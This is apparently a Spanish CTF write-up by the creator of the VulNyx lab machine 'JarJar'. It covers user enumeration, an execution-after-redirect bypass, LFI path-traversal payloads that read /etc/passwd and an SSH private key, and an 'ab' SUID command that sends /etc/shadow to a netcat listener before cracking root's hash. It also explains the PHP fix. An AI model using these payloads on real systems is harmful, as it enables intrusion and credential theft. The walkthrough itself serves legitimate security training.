# JarJar — VulNyx (Write-up)

## Introducción

Muy buenas y bienvenidos a la resolución de la máquina **JarJar** de VulNyx. Esta es otra de las máquinas que hago para la plataforma; en este caso es el inicio de una **saga basada en Star Wars**. Espero que os guste, ¡empecemos con la resolución!

A continuación, las técnicas que nos encontraremos. Vamos a poner todas las que hay, como si fuera un pentest:

- **Username Enumeration** a través del `login.php`.
- **Authentication Bypass via Direct Access**.
- **Local File Inclusion** — Approved Path (EAR).
- **PrivEsc** — `/usr/bin/ab` SUID.

---

## Reconocimiento

La propia máquina nos da su IP, que en mi caso es `192.168.93.130`. También se podría encontrar con:

```bash
arp-scan -I <tu-interfaz> --localnet
# o
nmap -sn <tu-red>/24
```

Una vez tenemos la IP de JarJar, hacemos un escaneo para ver qué puertos hay abiertos:

```bash
sudo nmap -sCV -p- -T5 192.168.93.130 -oN scan
```

Tenemos el típico puerto **22** y **80**, lo que seguramente significa que será hacking web… siendo el creador de la máquina, os lo confirmo 😂.

Nos vamos directamente a la web a ver qué aparece. De primeras sale una intro chulísima de Star Wars (me costó lo suyo encontrar una plantilla que quedase bien, así que estoy muy orgulloso, jeje). Si nos fijamos, al final aparece lo que parece un **virtual host**; lo añadimos al `/etc/hosts` para ver si la página cambia al entrar.

Lo añadimos (como veis tengo varios virtual hosts, le estoy dando caña a HackTheBox 😄). Al entrar a la página vemos una totalmente diferente.

Cuando inspeccionamos la página, es la típica con lore de la saga y poco más. Hacemos los checks de siempre:
- Revisamos las cabeceras por si filtran algo → no saca gran cosa, pero es algo que siempre hay que hacer por si acaso.
- **DevTools → Network** y recargamos, por si carga algún archivo que no debería → tampoco saca gran cosa.
- Revisar el código en busca de archivos JavaScript o comentarios → la máquina no va por ahí.

El path va por el **Admin Panel** y su funcionalidad, que explicaremos más adelante.

---

## Username Enumeration

Si le damos, nos redirige a una web de login; suponemos que para acceder al admin panel tenemos que estar logueados.

Aquí es donde viene el **User Enumeration**. Antes, en la parte de _Character_, había 3 usuarios:
- JarJar
- Obiwan
- Quigon

Los probamos para ver si existen en el sistema o no. Si ponemos uno que no existe, cambia el mensaje de error: esa es una manera de enumerar si el usuario existe. Otra forma es fijarse en el `Length` de la respuesta.
- Con `JarJar` → nos devuelve **Invalid Password** (el usuario existe).
- Con `admin` → nos aparece **Invalid Username or Password** (no existe).

Esto demuestra que podemos enumerar usuarios. El mensaje de error distinto para cuando existe y para cuando no podría usarse en un ataque de fuerza bruta, pero en este caso no aplica porque no es el path.

---

## Authentication Bypass via Direct Access

Cuando hay un redirect, nosotros como pentesters tenemos que hacer **SIEMPRE** una comprobación de cómo se está gestionando la petición. A veces puede pasar que se haya configurado mal y podamos abusar de ella si la analizamos correctamente, como justamente ocurre en esta máquina: por detrás se ha cometido un fallo en el código fuente que nos permitirá entrar al admin panel sin proporcionar contraseña. Vamos a ello.

Le damos a _admin panel_ e interceptamos la petición para ver cómo se gestiona. A primera vista no vemos nada raro, solamente las cookies (con las que quizá podamos hacer algo).

Para inspeccionar los redirects tenemos una manera de saber cómo se gestionan y si están configurados correctamente: le damos a **Do Intercept → Response to this request**, con lo que interceptaremos la respuesta del redirect, y luego **Forward**.

Como resultado, tenemos acceso al código fuente de la página `admin.php`. Podemos ver incluso directorios a los que antes no teníamos acceso (si hubiéramos hecho fuzzing tampoco los habríamos encontrado). Esta es una manera de entrar: coges el nuevo directorio y lo pones directamente en la URL:

```
http://jarjar.nyx/login.php/secure_files_admin/users.php
```

Pero la manera correcta, y que siempre funcionará, es cambiar el estado del redirect (**302**) a un **200**. Así, cuando enviemos la respuesta, en vez de hacer el redirect será un 200 y tendremos acceso directo. Esta es la forma correcta de entrar, porque puede que no siempre haya esos directorios expuestos en el código fuente, pero lo que siempre funcionará será cambiar el código de estado.

Cambiamos de `302` a `200`, le damos a **Forward** y boom: tenemos acceso al admin panel.

### ¿Qué acaba de pasar?

Muchos os preguntaréis qué acaba de pasar y por qué ha funcionado. Vamos a entenderlo de forma sencilla.

Para un redirect normalmente se utiliza la cabecera `Location:`. Por detrás, la aplicación redirige al `/admin.php` a los usuarios autenticados; si no lo estás y no tienes una sesión activa, te redirige al `/login.php` para autenticarte con un usuario válido.

¿Cómo se vería en PHP? Así:
```php
if(!$_SESSION['active']) {
    header("Location: login.php");
}
```

Al hacer la petición a `admin.php` se ejecuta este pedacito de código, que es vulnerable a lo que acabamos de explotar. ¿Por qué?

El script PHP de arriba **no detiene la ejecución**, lo que provoca que la información protegida de la página se envíe en el cuerpo de la respuesta, permitiéndonos ver el contenido entero. Pero si accedemos directamente desde el navegador, este sigue el redirect y nos lleva al `login.php`; por eso mostré arriba cómo bypassearlo cambiando el código de `302` a `200`.

Para evitar que la información protegida se devuelva en el cuerpo de la respuesta del redirect, el script PHP necesita **salir** después de emitir la redirección:
```php
if(!$_SESSION['active']) {
    header("Location: login.php");
    exit;
}
```

En el script vulnerable, en ningún momento se corta el redirect y se queda "en bucle", por eso podemos ver la información. Simplemente con un `exit;` terminamos la petición y nunca ocurriría esta vulnerabilidad.

> **Nota:** este patrón (información sensible devuelta en el cuerpo de una respuesta de redirección porque falta el `exit`) se conoce como **EAR — Execution After Redirect**.

---

## Local File Inclusion

Cuando accedemos al panel de administración, en la parte de **Logs** encontramos arriba un parámetro que se pone automáticamente: el parámetro `logs`.

Si no lo tuviéramos, podríamos haber hecho fuzzing con `ffuf` o `wfuzz`, pero no es el caso.

Parece que está mostrando un archivo `.log` alojado en alguna carpeta del servidor. Si el parámetro se llama `logs`, vamos a suponer que la carpeta es `/logs`.

Cuando ponemos un payload básico de LFI, nos muestra un mensaje de error. La web app comprueba que el input del parámetro contenga un path específico definido en el servidor. Siempre que veáis que restringe de esta manera, tenéis que pensar instantáneamente en la técnica **Approved Path**: muchas web apps la usan para evitar LFI + Path Traversal, obligándote a poner el path específico para mostrar el archivo. Pero, ¿qué pasa si ha sido mal gestionada y la sanitización es escasa?

Vamos a probar poniendo al principio del input `./logs` y después el Path Traversal:

```
./logs/../../../etc/passwd
```

¡Ha desaparecido el mensaje de **Illegal Path Specified!**. Parece que hemos bypasseado la regex que valida si está el `/logs` o no. Ahora solo queda tirar hacia atrás los directorios para llegar a la raíz `/` del sistema, y nos muestra el `/etc/passwd`.

¡Lo hemos bypasseado con éxito! Teníamos 3 usuarios enumerados antes con el User Enumeration; vamos a ver si existen también en el sistema o solo son usuarios del web server. **¡Existen!** Vamos a buscar por claves SSH.

Buscamos por la `id_rsa` de **JarJar**, que es el usuario que parece más indicado por el nombre de la máquina:

```
http://jarjar.nyx/secure_files_admin/files.php?logs=./logs/../../../../home/jarjar/.ssh/id_rsa
```

Y obtenemos la `id_rsa` del usuario JarJar. La copiamos a un archivo `id_rsa`, le ponemos los permisos indicados y entramos por SSH:

```bash
chmod 600 id_rsa
ssh -i id_rsa jarjar@jarjar.nyx
```

¡Y entramos! Ya estamos dentro de la máquina JarJar.

---

## Escalada de privilegios — binario `ab` (SUID)

Cuando buscamos por permisos `sudo`, no está instalado. Al buscar por binarios **SUID** encontramos uno llamado `/usr/bin/ab`:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Este binario está en **GTFOBins**, así que es fácil escalar a root. Quería poner una escalada más complicada, pero viendo las vulnerabilidades que toca la máquina (que no son tan "comunes"), pensé que sería mejor una escalada muy fácil. Aun así, `ab` está chula de explotar, por eso la puse.

> `ab` (Apache Benchmark) viene instalado junto con `apache2` por defecto.

Viendo cómo funciona, simplemente tenemos que crear un listener con netcat y enviarnos un archivo del sistema. La vía es el `/etc/shadow`, que contiene el hash de root, y le haremos fuerza bruta con `john`.

Primero abrimos el listener:
```bash
nc -lvnp 4444
```

Seguidamente nos enviamos el archivo:
```bash
/usr/bin/ab -p /etc/shadow http://192.168.93.128:4444/shadow
```

Lo recibimos. Cogemos el hash de root y le quitamos todo lo innecesario:
```
root:$y$j9T$06k8CpwIHWwvgOizpHNH30$VTfTBXChehaq8kPRI5Lhh54LIRXdbkoP3ZxOGQaxqZ0
```

Si hacemos fuerza bruta sin especificar el tipo de hash, no funcionará correctamente porque no le indicamos el formato. Cuando atacamos un hash del sistema como el del `/etc/shadow`, es necesario especificar el formato; en este caso es `crypt`:
```bash
john --format=crypt --wordlist=/usr/share/wordlists/rockyou.txt hash
```

Y conseguimos la contraseña de **root**.

---

_Write-up de la máquina **JarJar** — VulNyx · Inicio de la saga Star Wars._